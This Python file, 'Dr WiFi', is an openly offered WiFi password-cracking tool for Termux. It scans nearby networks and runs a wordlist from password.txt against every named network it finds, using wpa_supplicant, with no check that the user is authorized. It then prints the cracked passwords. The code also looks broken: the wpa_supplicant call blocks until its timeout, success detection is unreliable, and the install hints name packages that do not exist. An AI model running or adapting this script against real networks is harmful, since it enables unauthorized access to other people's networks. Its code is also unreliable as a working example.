#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Dr WiFi - WiFi Password Cracker Tool
Author: Dr WiFi
Description: WiFi network scanner and password cracker for Termux
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_logo():
    """Display the Dr WiFi ASCII logo"""
    logo = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ██████╗     ██╗    ██╗██╗███████╗██╗███████╗    ║
║   ██╔═══██╗██╔══██╗    ██║    ██║██║██╔════╝██║██╔════╝    ║
║   ██║   ██║██████╔╝    ██║ █╗ ██║██║█████╗  ██║█████╗     ║
║   ██║   ██║██╔══██╗    ██║███╗██║██║██╔══╝  ██║██╔══╝     ║
║   ╚██████╔╝██║  ██║    ╚███╔███╔╝██║██║     ██║██║        ║
║    ╚═════╝ ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝        ║
║                                                              ║
║              {Colors.YELLOW}WiFi Password Cracker Tool{Colors.CYAN}              ║
║                    {Colors.GREEN}For Termux{Colors.CYAN}                        ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
    print(logo)
    print(f"{Colors.YELLOW}{Colors.BOLD}🔍 Scanning for WiFi networks...{Colors.END}\n")

def check_requirements():
    """Check if required tools are installed"""
    required_tools = ['iwlist', 'iwconfig', 'aircrack-ng']
    
    print(f"{Colors.BLUE}🔧 Checking requirements...{Colors.END}")
    
    for tool in required_tools:
        try:
            subprocess.run([tool, '--help'], capture_output=True, check=True)
            print(f"{Colors.GREEN}✅ {tool} - Available{Colors.END}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}❌ {tool} - Not found{Colors.END}")
            print(f"{Colors.YELLOW}💡 Install with: pkg install {tool}{Colors.END}")
            return False
    
    return True

def get_wifi_networks():
    """Scan and get available WiFi networks"""
    networks = []
    
    try:
        # Get wireless interfaces
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        interfaces = []
        
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        
        if not interfaces:
            print(f"{Colors.RED}❌ No wireless interfaces found{Colors.END}")
            return networks
        
        # Scan for networks on each interface
        for interface in interfaces:
            print(f"{Colors.BLUE}📡 Scanning on interface: {interface}{Colors.END}")
            
            try:
                # Use iwlist to scan networks
                scan_result = subprocess.run(
                    ['iwlist', interface, 'scan'], 
                    capture_output=True, 
                    text=True, 
                    timeout=30
                )
                
                if scan_result.returncode == 0:
                    # Parse scan results
                    lines = scan_result.stdout.split('\n')
                    current_network = {}
                    
                    for line in lines:
                        line = line.strip()
                        
                        if 'Cell' in line and 'Address' in line:
                            if current_network:
                                networks.append(current_network)
                            current_network = {}
                            current_network['bssid'] = line.split('Address: ')[1]
                        
                        elif 'ESSID:' in line:
                            essid = line.split('ESSID:')[1].strip().strip('"')
                            if essid:  # Only add networks with names
                                current_network['ssid'] = essid
                        
                        elif 'Channel:' in line:
                            channel = line.split('Channel:')[1].strip()
                            current_network['channel'] = channel
                        
                        elif 'Encryption key:' in line:
                            encryption = line.split('Encryption key:')[1].strip()
                            current_network['encryption'] = encryption
                    
                    if current_network:
                        networks.append(current_network)
                        
            except subprocess.TimeoutExpired:
                print(f"{Colors.YELLOW}⚠️  Timeout scanning {interface}{Colors.END}")
                continue
            except Exception as e:
                print(f"{Colors.RED}❌ Error scanning {interface}: {e}{Colors.END}")
                continue
    
    except Exception as e:
        print(f"{Colors.RED}❌ Error getting wireless interfaces: {e}{Colors.END}")
    
    return networks

def load_passwords():
    """Load passwords from password.txt file"""
    passwords = []
    
    try:
        if os.path.exists('password.txt'):
            with open('password.txt', 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Colors.GREEN}✅ Loaded {len(passwords)} passwords from password.txt{Colors.END}")
        else:
            print(f"{Colors.RED}❌ password.txt not found{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Error loading passwords: {e}{Colors.END}")
    
    return passwords

def test_password(network, password):
    """Test a password against a WiFi network"""
    try:
        # Create a temporary wpa_supplicant configuration
        config_content = f"""ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1

network={{
    ssid="{network['ssid']}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}"""
        
        with open('/tmp/wpa_supplicant.conf', 'w') as f:
            f.write(config_content)
        
        # Try to connect using wpa_supplicant
        result = subprocess.run([
            'wpa_supplicant', '-i', 'wlan0', '-c', '/tmp/wpa_supplicant.conf', '-t'
        ], capture_output=True, timeout=10)
        
        # Check if connection was successful
        if result.returncode == 0 and 'WPA: Key negotiation completed' in result.stdout.decode():
            return True
        
        return False
        
    except Exception:
        return False

def crack_wifi(network, passwords):
    """Attempt to crack WiFi password"""
    print(f"{Colors.CYAN}🔓 Testing passwords for: {network['ssid']}{Colors.END}")
    
    for i, password in enumerate(passwords, 1):
        print(f"\r{Colors.YELLOW}Testing password {i}/{len(passwords)}: {password}{Colors.END}", end='', flush=True)
        
        if test_password(network, password):
            print(f"\n{Colors.GREEN}🎉 SUCCESS! Password found for {network['ssid']}: {password}{Colors.END}")
            return password
        
        # Small delay to avoid overwhelming the system
        time.sleep(0.1)
    
    print(f"\n{Colors.RED}❌ No password found for {network['ssid']}{Colors.END}")
    return None

def main():
    """Main function"""
    print_logo()
    
    # Check requirements
    if not check_requirements():
        print(f"\n{Colors.RED}❌ Please install required tools first{Colors.END}")
        return
    
    print(f"\n{Colors.BLUE}🚀 Starting WiFi scan...{Colors.END}")
    
    # Get WiFi networks
    networks = get_wifi_networks()
    
    if not networks:
        print(f"{Colors.RED}❌ No WiFi networks found{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}📡 Found {len(networks)} WiFi networks:{Colors.END}")
    
    # Display networks
    for i, network in enumerate(networks, 1):
        ssid = network.get('ssid', 'Unknown')
        bssid = network.get('bssid', 'Unknown')
        channel = network.get('channel', 'Unknown')
        encryption = network.get('encryption', 'Unknown')
        
        print(f"{Colors.CYAN}{i}. {Colors.BOLD}{ssid}{Colors.END}")
        print(f"   BSSID: {bssid}")
        print(f"   Channel: {channel}")
        print(f"   Encryption: {encryption}")
        print()
    
    # Load passwords
    passwords = load_passwords()
    
    if not passwords:
        print(f"{Colors.RED}❌ No passwords loaded. Please check password.txt{Colors.END}")
        return
    
    print(f"\n{Colors.BLUE}🔓 Starting password cracking...{Colors.END}")
    
    # Try to crack each network
    successful_cracks = []
    
    for network in networks:
        if network.get('ssid'):
            password = crack_wifi(network, passwords)
            if password:
                successful_cracks.append({
                    'ssid': network['ssid'],
                    'password': password,
                    'bssid': network.get('bssid', 'Unknown')
                })
    
    # Display results
    print(f"\n{Colors.GREEN}{Colors.BOLD}🎯 CRACKING RESULTS:{Colors.END}")
    print("=" * 50)
    
    if successful_cracks:
        for crack in successful_cracks:
            print(f"{Colors.GREEN}✅ Network: {crack['ssid']}{Colors.END}")
            print(f"{Colors.GREEN}   Password: {crack['password']}{Colors.END}")
            print(f"{Colors.GREEN}   BSSID: {crack['bssid']}{Colors.END}")
            print()
    else:
        print(f"{Colors.RED}❌ No passwords cracked successfully{Colors.END}")
    
    print(f"{Colors.YELLOW}🔚 Dr WiFi tool completed{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Operation cancelled by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Unexpected error: {e}{Colors.END}") 